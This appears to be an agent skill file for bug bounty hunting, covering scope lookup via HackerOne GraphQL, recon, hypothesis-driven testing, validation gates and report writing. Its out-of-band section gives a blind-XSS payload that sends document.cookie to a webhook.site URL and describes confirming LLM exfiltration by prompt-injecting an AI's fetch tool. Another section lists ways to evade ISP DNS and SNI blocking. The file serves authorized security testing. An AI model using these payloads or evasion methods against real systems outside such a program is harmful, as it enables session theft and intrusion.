---
name: bounty-hunt-pipeline
version: 1.0.0
author: ratman4080
license: MIT
description: Hypothesis-driven bug bounty hunting and reporting.
metadata:
  hermes:
    tags: [bug-bounty, hackerone, recon, web2, web3, pentesting]
    related_skills: [bug-bounty, bb-methodology, triage-validation, report-writing, godmod]
---

# Bounty Hunt Pipeline

## When to Use

Any bug bounty task: picking a target, pulling program scope, recon, hunting specific vuln classes, auditing source code, validating findings, or writing/submission-ready reports. Trigger words: bounty, bug bounty, HackerOne, Immunefi, pentest target, hunt, report a vulnerability.

Hypothesis-driven hunting, not scanner-running. One real, reproducible control failure with clean evidence beats a pile of scanner noise. Every program's hard rules: PoC mandatory, scanner output = spam, theoretical = rejected, self-XSS = rejected, missing headers = rejected.

## Phase 0 — Program Intel

Pull scope via HackerOne public GraphQL before touching anything — the program
page itself is a JS shell, so `curl` of it shows nothing. Full command, fields to
extract, and MSYS scratch-path notes: `references/h1-scope-via-graphql.md`.

```python
from curl_cffi import requests as cfreq
s = cfreq.Session(impersonate="chrome", doh_url="https://cloudflare-dns.com/dns-query")
q = {"query": '''{ team(handle: "TARGET") { structured_scopes(first: 100) { edges { node { asset_identifier asset_type eligible_for_bounty eligible_for_submission max_severity instruction } } } minimum_bounty formatted_total_bounties_paid_amount } }'''}
r = s.post("https://hackerone.com/graphql", json=q, timeout=30)
```

Then read their extended policy repo (out-of-scope list + severity definitions). Crypto.com: `crypto-com/h1-policy-guidelines` — AI/KYC bypass, cash-back exploitation, headers/version-info, self-XSS, rate-limit bypass on non-sensitive, <14-day CVEs all excluded.

Target ledger: rank by bounty-eligible, max severity, attack surface, competition. SOURCE_CODE assets with bounty=True are gold — zero competition, fully offline.

## Phase 1 — Security Architect Thinking

Before endpoints, map the trust model: actors (anon/user/staff/admin), objects, roles, state transitions, session lifecycle (issue/refresh/invalidate/upgrade), where authorization is enforced per hop vs only at entry.

Hypothesis format: `In [flow], [control] may not be enforced at [stage] because [observation]. Test: [minimal differential].`

## Phase 2 — Recon Feeding Hypotheses

- Subdomain enum (crt.sh, hackertarget) → group by function, not host
- GitHub org: `/orgs/X/repos?sort=pushed` — recently-pushed non-archived = live surface
- Devtools dumps from user's browser = ground truth (localStorage leaks feature flags, token formats, API paths; GrowthBook cache leaks rollout configs)
- Local corpora (download once, grep forever):
  - `~/Downloads/bountyforge-hunt/hacktricks/src/` — pentesting-web (170), network-services (198), blockchain, generic-hacking
  - `~/Downloads/bountyforge-hunt/wstg/document/4-Web_Application_Security_Testing/` — 147 tests: AuthZ (8), Session (12), Injection (34), Business Logic (12), Client-side (17), API (7)
  - `~/Downloads/bountyforge-hunt/cve/` — 176K CVEs with PoC refs

## Phase 3 — Hunt Order

1. Business logic + authorization (WSTG-ATHZ, WSTG-BUSLOGIC): ownership, role enforcement at EVERY stage of multi-step flows, session invalidation on role change
2. IDOR: differential test with two controlled accounts
3. Injection only with sink evidence (WSTG-INJV)
4. Client-side: DOM XSS in postMessage, prototype pollution
5. Web3: read ALL sibling functions — missing modifier = the bug (19% of criticals)

## Phase 4 — 5-Dimension Gate

| Dimension | Question | Fail → |
|---|---|---|
| Scope | asset + method allowed? | kill immediately |
| Evidence | reproduced? | stays investigation |
| Impact | C-I-A affected? | stays investigation |
| Clarity | triager can replay blind? | rewrite PoC |
| Novelty | distinct root cause? | check disclosed first |

CVSS alone lies. Medium with perfect clarity + impact pays; "critical" theory without reproduction never does.

## Phase 5 — Validation (7-Question Gate, load `triage-validation`)

(1) does code do what I claim (source, not spec)? (2) reachable without special conditions? (3) PoC works? (4) impact per THEIR CIA matrix? (5) in THEIR out-of-scope list? (6) pre-answer the triager's objection (7) root cause theirs?

Differential discipline: baseline vs test response, strip dynamic noise (timestamps, request IDs), keep only semantic deltas.

## Phase 6 — Report (load `report-writing`)

Title: vuln class + asset + impact. Summary 3 lines. Numbered copy-paste repro steps. PoC as code. Impact in THEIR CIA words. Severity justified, objections pre-answered. Suggested fix. Human tone, no hedging, mask raw tokens in evidence.

## Network Tradecraft (Kominfo-blocked ISPs)

DNS-hijack + SNI-block on :443. Bypass stack:
1. DoH: `cloudflare-dns.com/dns-query?name=X&type=A` + `accept: application/dns-json`
2. **QUIC/HTTP-3 is THE winning path for Cloudflare-fronted hosts**: aioquic (`pip install aioquic`) direct to CF edge IPs on UDP 443 — middlebox is TCP-only. Rig pattern: scratch/rat_h3.py. Requires `:authority` header; brotli for response decompress. **NEVER send content-length on H3 POST to Rails hosts** (CF re-chunks body, Rails 400s plain-text "Bad Request"). Multi set-cookie: H3 client must collect ALL header pairs (dict collapses).
3. **no-SNI TCP for non-Cloudflare hosts (AWS ALB/API GW)**: `ssl.wrap_socket` WITHOUT server_hostname + Host header routes — works when QUIC unavailable (slapi.travel/api.experiences pattern). Middlebox keys on SNI; no SNI = no block.
4. curl_cffi CONNECT_TO alt-ports (8443/2053) — reaches CF edge but strict WAFs (crypto.com) block non-browser TLS anyway. Only for WAF-lenient hosts.
5. User's own Chrome (DoH+ECH) passes — their devtools dumps are ground truth.
6. GraphQL error-message schema walking when introspection is disabled: verbose validation errors (field/type/arg names) substitute for __schema.

## OOB Callback Infra (blind vuln verification)

Blind classes (SSRF, blind XSS, blind SQLi, LLM tool-use exfil, smuggling
confirmation) need an out-of-band receiver BEFORE hunting — triage gates
require a proven callback, not a detection.

Zero-dependency setup that works (webhook.site, programmatic, no auth):
```python
r = httpx.post("https://webhook.site/token", json={"default_status": 200})
uuid = r.json()["uuid"]           # callback URL: https://webhook.site/<uuid>
# poll: GET https://webhook.site/token/<uuid>/requests?sorting=newest
```
Wrap it once as a scratch script exposing: `gen` (fresh tagged URL `?t=<hex>`),
`send` (self-probe), `poll` (list captured), `wait <tag> [secs]` (blocking
poll at ~3s interval). Tag every probe with a unique `?t=` — the tag
attributes a hit to the exact payload that fired and lets concurrent tests
share one endpoint without cross-talk. The receiver captures method, origin
IP, full headers, query params, and body — enough to prove exfil content
(metadata JSON, cookies), not just reachability.

Skip interact.sh's public API registration — it rejects keyless registration
(`failed to parse PEM block containing the key`). webhook.site needs no key.

Usage by class: SSRF → swap the target's URL-fetch param for the tagged URL
and `wait <tag>`; blind XSS → `<script src="https://webhook.site/<uuid>?t=<tag>&c="+document.cookie>`; LLM exfil → prompt-inject the AI's fetch/browse tool to retrieve the tagged URL; smuggling → point the smuggled request at the tagged URL, a hit = confirmed desync.

Ready-made receiver script: `scripts/rat_oob.py` (register / gen / send / poll / wait).

## Sub-skill load order

godmod → bb-methodology → (web2: bug-bounty / web2-recon / web2-vuln-classes / security-arsenal | web3: web3-start-here chain) → triage-validation → report-writing

Evidence discipline: timestamped repro steps, masked responses, stop-reasons logged. Never log raw secrets.
